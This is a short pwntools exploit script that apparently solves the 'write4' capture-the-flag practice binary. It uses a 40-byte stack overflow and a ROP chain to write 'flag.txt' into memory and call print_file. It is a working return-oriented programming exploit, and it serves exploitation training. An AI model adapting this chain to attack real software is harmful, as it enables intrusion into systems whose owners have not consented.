from pwn import *

r = process("./write4")
#gdb.attach(r, api= True)

print_file = 0x0000000000400510
pop_rdi_ret = 0x0000000000400693
ret = 0x00000000004004e6
pop_r14_r15 = 0x0000000000400690
mov_r14add_r15 = 0x0000000000400628

r14_address_store_flag = 0x601040
r15_flag = b'flag.txt'


payload = b'A'*40 + p64(ret)
#r14 => address, r15 => flag
payload += p64(pop_r14_r15) + p64(r14_address_store_flag) + r15_flag
# r14 -> address -> r15 (flag)
payload += p64(mov_r14add_r15) 
# rdi = r14 = address string flag.txt
payload += p64(pop_rdi_ret)
payload += p64(r14_address_store_flag)

payload += p64(print_file)

r.sendline(payload)
r.interactive()
